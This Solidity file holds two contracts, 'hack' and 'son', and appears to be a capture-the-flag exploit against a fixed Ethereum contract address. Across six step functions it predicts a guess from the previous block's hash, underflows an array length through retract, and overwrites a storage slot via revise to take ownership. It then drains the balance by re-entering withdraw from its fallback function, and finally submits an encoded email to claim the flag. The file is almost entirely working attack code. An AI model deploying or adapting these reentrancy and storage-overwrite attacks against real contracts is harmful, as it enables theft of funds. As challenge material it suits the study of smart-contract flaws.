pragma solidity ^0.4.23;

contract hack {
    address instance_address = 0x168892cb672a747f193eb4aca7b964bfb0aa6476;
    uint have_withdraw = 0;
    
    int cnt = 0;
    
    constructor() payable {
        // gift()
        address(instance_address).call(bytes4(0x24b04905));
    }
    
    function step1() public {
        // storage[0x02] == 1
        address(instance_address).call(bytes4(0x23de8635), 0);
    }
    
    function fake(uint256 _i) public returns(uint256) {
        if(cnt == 1) {
            return 1;
        }
        cnt = 1;
        return 0;
    }

    function step2() public {
        // guess(uint256)
        uint256 v = uint256(block.blockhash(block.number-1)) % 3;
        address(instance_address).call(bytes4(0x9189fec1), v);
        // buy()
        address(instance_address).call(bytes4(0xa6f2ae3a));
    }
    
    function step3() public {
        // retract()
        assert(address(instance_address).call(bytes4(0x47f57b32)));
    }
    
    function step4() public {
        // revise(uint256,bytes32)
        uint256 solt = 2**256-0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6;
        address(instance_address).call(bytes4(0x0339f300), solt, 2**160 + uint256(address(this)));
    }
    
    function step5() public {
        // withdraw
        address(instance_address).call(bytes4(0x2e1a7d4d), 100);
    }
    
    function() payable {
        if (have_withdraw <=2 && msg.sender == instance_address) {
            have_withdraw += 1;
            address(instance_address).call(bytes4(0x2e1a7d4d), 100);
        }
    }
    
    function step6(string b64email) public {
        address(instance_address).call(bytes4(0x6bc344bc), b64email);
    }
}

contract son {
    address instance_address = 0x168892cb672a747f193eb4aca7b964bfb0aa6476;
    
    constructor() payable {
        // gift()
        address(instance_address).call(bytes4(0x24b04905));
        // transfer
        address(instance_address).call(bytes4(0xa9059cbb), address(0x2db8f907965a5742f16f82cddced585f8bc04111), 100);
    }
}
